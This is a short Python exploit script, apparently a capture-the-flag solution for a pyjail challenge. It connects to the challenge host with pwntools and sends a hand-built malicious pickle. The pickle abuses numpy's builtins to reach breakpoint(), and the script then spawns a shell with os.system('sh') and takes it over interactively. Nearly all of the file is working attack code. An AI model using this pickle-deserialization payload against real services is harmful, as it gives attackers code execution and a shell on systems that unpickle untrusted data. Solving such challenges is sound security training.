from pwn import remote
from pickle import * 
# nc challs1.pyjail.club 6274
r = remote("challs1.pyjail.club", 6274)

pkl = ( 
        GLOBAL + b"numpy\nsafernumpy\n" +
        MARK + 
            NONE + 
            GLOBAL + b"numpy\n__builtins__\n" + 
        TUPLE + 
        BUILD + 
        GLOBAL + b"numpy\nbreakpoint\n" + 
        EMPTY_TUPLE + 
        REDUCE +
       STOP
)

r.sendlineafter(">", pkl.hex())
r.sendline(b'__import__("os").system("sh")')
r.interactive()